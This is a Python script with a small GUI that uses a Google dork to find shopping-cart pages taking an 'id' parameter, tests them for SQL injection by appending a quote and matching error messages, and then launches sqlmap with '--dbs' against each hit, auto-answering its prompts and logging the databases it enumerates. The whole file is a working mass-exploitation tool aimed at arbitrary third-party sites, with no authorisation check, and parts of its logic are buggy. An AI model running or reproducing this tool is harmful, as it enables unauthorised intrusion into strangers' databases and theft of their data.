import os
import requests
import selenium
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import selenium.webdriver
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import subprocess
import threading
import tkinter as tk
from tkinter import scrolledtext

posibilitis = ["SQL", "SQL syntax error", "MySQL", "MySQL Error", "MySQL Syntax", "MySQL Syntax Error", "MySQL Error Syntax", "MySQL Error Syntax Error", "SQL Error", "SQL Syntax", "SQL Syntax Error", "SQL Error Syntax", "SQL Error Syntax Error", "mysql_error", "mysql_error()", "mysql_error() syntax", "mysql_error() syntax error", "mysql_error() error", "mysql_error() error syntax", "mysql_error() error syntax"]

class GetUrls:
    def __init__(self):
        self.base_url = "https://google.com/search?q="
        self.query = "inurl:cart.php?id="
        self.headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36"}
        self.driver = selenium.webdriver.Chrome(executable_path="D:\\CODE\\SRC\\chromedriver_win32\\chromedriver.exe")
    def get_urls(self):
        self.driver.get(url=f"{self.base_url}{self.query}")
        results = self.driver.find_elements(By.CLASS_NAME, "MjjYud")
        urls = []
        for result in results:
            url = result.find_element(By.TAG_NAME, "a").get_attribute("href")
            urls.append(url)
        return urls

class ValidateUrl:
    def __init__(self):
        self.url = GetUrls().get_urls()
    def Validate(self):
        links = []
        for link in self.url:
            try:
                HackLink = f"{link}%27"
                data = requests.get(HackLink, headers=GetUrls().headers)
                print(f"Validating: {HackLink}")
                for posibility in posibilitis:
                    if posibility in data.text:
                        print(f"Vulnerable: {HackLink}")
                        links.append(link)
                    elif len(links) == 0:
                        print("This site is not vulnerable")
            except:
                print("Error while validating")
        return links

class HackSite:
    def __init__(self):
        self.urls = GetUrls().get_urls()
        self.headers = GetUrls().headers
        self.sqlmapdir = "./sqlmap/sqlmap.py"

    def Hack(self):
        def reader_thread(process):
            is_good_to_go = False
            while True:
                line = process.stdout.readline().decode()
                if line == '':
                    break
                if 'you have not declared cookie(s), while server wants to set its own' in line:
                    process.stdin.write(b'y\n')
                    process.stdin.flush()
                if "WAF/IPS identified as 'ModSecurity (Trustwave)'" in line:
                    if 'are you sure that you want to continue with further target testing' in line:
                        process.stdin.write(b'n\n')
                        process.stdin.flush()
                if "it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes?" in line:
                    process.stdin.write(b'y\n')
                    process.stdin.flush()
                if "for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values?" in line:
                    process.stdin.write(b'y\n')
                    process.stdin.flush()
                    is_good_to_go = True
                if "[*]" in line or "information_shema":
                    with open("databases.txt", "a") as f:
                        f.write(line)
                    
                else:
                    print(line)

        for link in self.urls:
            try:
                process = subprocess.Popen(f"python {self.sqlmapdir} -u {link} --dbs", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                reader = threading.Thread(target=reader_thread, args=(process,))
                reader.start()
                process.wait()
                reader.join()
            except Exception as e:
                print("Error:", str(e))

def run_hack_site():
    # Create an instance of your HackSite class
    hack_site = HackSite()

    # Run the Hack method in a new thread to avoid freezing the GUI
    threading.Thread(target=hack_site.Hack).start()

# Create the main window
root = tk.Tk()

# Create a scrolled text widget for the output
output = scrolledtext.ScrolledText(root)
output.pack()

# Redirect print statements to the scrolled text widget
def print(*args, **kwargs):
    text = ' '.join(map(str, args))
    output.insert(tk.END, text + '\n')

# Create a button that runs the Hack method when clicked
button = tk.Button(root, text='Submit', command=run_hack_site)
button.pack()

# Start the main loop
root.mainloop()